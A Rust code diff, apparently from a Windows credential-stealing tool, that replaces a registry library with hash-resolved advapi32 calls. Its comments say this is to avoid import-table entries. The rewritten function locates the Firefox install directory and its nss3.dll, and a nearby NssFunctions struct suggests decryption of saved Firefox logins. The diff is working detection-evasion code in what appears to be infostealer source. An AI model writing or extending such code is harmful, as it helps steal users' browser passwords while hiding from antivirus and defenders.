@@ -104,8 +104,84 @@ unsafe fn resolve_api_or_load<T>(
     let fn_addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
     Some(std::mem::transmute::<_, T>(fn_addr))
 }
-use winreg::enums::{HKEY_LOCAL_MACHINE, KEY_READ};
-use winreg::RegKey;
+// ── Registry helpers via pe_resolve (no IAT entries) ───────────────────────
+//
+// advapi32.dll registry functions resolved at runtime to avoid IAT entries.
+
+type FnRegOpenKeyExW = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *mut *mut c_void) -> i32;
+type FnRegQueryValueExW = unsafe extern "system" fn(*mut c_void, *const u16, *mut u32, *mut u8, *mut u8, *mut u32) -> i32;
+type FnRegCloseKey = unsafe extern "system" fn(*mut c_void) -> i32;
+
+/// Resolve advapi32.dll base by hashing its name at runtime.
+fn advapi32_base() -> Option<usize> {
+    let wide: Vec<u16> = "advapi32.dll\0".encode_utf16().collect();
+    let hash = pe_resolve::hash_wstr(&wide[..wide.len() - 1]);
+    unsafe { pe_resolve::get_module_handle_by_hash(hash) }
+}
+
+/// Open a registry key via pe_resolve'd RegOpenKeyExW.
+///
+/// `hkey` is a predefined key handle (e.g. `0x80000002` for HKLM).
+/// `subkey` is a null-terminated UTF-16 wide string.
+/// `access` is the desired access mask (e.g. `0x20019` for KEY_READ).
+unsafe fn reg_open_key_ex(hkey: *mut c_void, subkey: &[u16], access: u32) -> Option<*mut c_void> {
+    let base = advapi32_base()?;
+    let f: FnRegOpenKeyExW = resolve_api_from_base(base, pe_resolve::hash_str(b"RegOpenKeyExW\0"))?;
+    let mut result: *mut c_void = ptr::null_mut();
+    if f(hkey, subkey.as_ptr(), 0, access, &mut result) == 0 {
+        Some(result)
+    } else {
+        None
+    }
+}
+
+/// Query a registry string value via pe_resolve'd RegQueryValueExW.
+///
+/// Reads a `REG_SZ` value and returns it as a String.
+unsafe fn reg_query_string_value(hkey: *mut c_void, name: &[u16]) -> Option<String> {
+    let base = advapi32_base()?;
+    let f: FnRegQueryValueExW = resolve_api_from_base(base, pe_resolve::hash_str(b"RegQueryValueExW\0"))?;
+
+    let mut buf_len: u32 = 0;
+    // First call: query size.
+    if f(hkey, name.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), &mut buf_len) != 0 {
+        return None;
+    }
+    if buf_len == 0 {
+        return None;
+    }
+    let mut buf = vec![0u8; buf_len as usize];
+    let mut data_type: u32 = 0;
+    if f(hkey, name.as_ptr(), ptr::null_mut(), &mut data_type, buf.as_mut_ptr(), &mut buf_len) != 0 {
+        return None;
+    }
+    // Only handle REG_SZ (1) and REG_EXPAND_SZ (2).
+    if data_type != 1 && data_type != 2 {
+        return None;
+    }
+    // Trim trailing nulls and convert UTF-16 to String.
+    let u16_slice: Vec<u16> = buf.chunks(2)
+        .filter_map(|c| if c.len() == 2 { Some(u16::from_le_bytes([c[0], c[1]])) } else { None })
+        .take_while(|&c| c != 0)
+        .collect();
+    String::from_utf16(&u16_slice).ok()
+}
+
+/// Close a registry key via pe_resolve'd RegCloseKey.
+unsafe fn reg_close_key(hkey: *mut c_void) {
+    if let Some(base) = advapi32_base() {
+        if let Some(f) = resolve_api_from_base::<FnRegCloseKey>(base, pe_resolve::hash_str(b"RegCloseKey\0")) {
+            f(hkey);
+        }
+    }
+}
+
+/// Resolve a typed function pointer from a known DLL base and function-name hash.
+#[inline(always)]
+unsafe fn resolve_api_from_base<T>(dll_base: usize, fn_hash: u32) -> Option<T> {
+    let addr = pe_resolve::get_proc_address_by_hash(dll_base, fn_hash)?;
+    Some(std::mem::transmute::<_, T>(addr))
+}
 
 // ── Public result types ────────────────────────────────────────────────────────
 
@@ -1858,18 +1934,31 @@ struct NssFunctions {
 }
 
 /// Find the Firefox installation directory from the registry, then common paths.
+///
+/// Uses pe_resolve'd advapi32 registry functions to avoid IAT entries.
 fn find_firefox_install_dir() -> Option<PathBuf> {
+    const HKEY_LOCAL_MACHINE: *mut c_void = 0x80000002 as *mut c_void;
+    const KEY_READ: u32 = 0x20019;
+
     // Try HKLM\SOFTWARE\Mozilla\Mozilla Firefox\CurrentVersion\Main\Install Directory
-    if let Ok(hklm) = RegKey::predef(HKEY_LOCAL_MACHINE).open_subkey_with_flags(
-        "SOFTWARE\\Mozilla\\Mozilla Firefox",
-        KEY_READ,
-    ) {
-        if let Ok(ver) = hklm.get_value::<String, _>("CurrentVersion") {
-            let subkey = format!("SOFTWARE\\Mozilla\\Mozilla Firefox\\{}\\Main", ver);
-            if let Ok(main_key) = RegKey::predef(HKEY_LOCAL_MACHINE)
-                .open_subkey_with_flags(&subkey, KEY_READ)
-            {
-                if let Ok(dir) = main_key.get_value::<String, _>("Install Directory") {
+    // All registry access uses pe_resolve'd RegOpenKeyExW / RegQueryValueExW / RegCloseKey.
+    unsafe {
+        let ff_key_wide: Vec<u16> = "SOFTWARE\\Mozilla\\Mozilla Firefox\0"
+            .encode_utf16().collect();
+        let hklm_ff = reg_open_key_ex(HKEY_LOCAL_MACHINE, &ff_key_wide, KEY_READ)?;
+
+        let curver_wide: Vec<u16> = "CurrentVersion\0".encode_utf16().collect();
+        let ver = reg_query_string_value(hklm_ff, &curver_wide);
+        reg_close_key(hklm_ff);
+
+        if let Some(ver) = ver {
+            let main_subkey = format!("SOFTWARE\\Mozilla\\Mozilla Firefox\\{}\\Main\0", ver);
+            let main_wide: Vec<u16> = main_subkey.encode_utf16().collect();
+            if let Some(main_key) = reg_open_key_ex(HKEY_LOCAL_MACHINE, &main_wide, KEY_READ) {
+                let installdir_wide: Vec<u16> = "Install Directory\0".encode_utf16().collect();
+                let dir = reg_query_string_value(main_key, &installdir_wide);
+                reg_close_key(main_key);
+                if let Some(dir) = dir {
                     let p = PathBuf::from(dir);
                     if p.join("nss3.dll").exists() {
                         return Some(p);
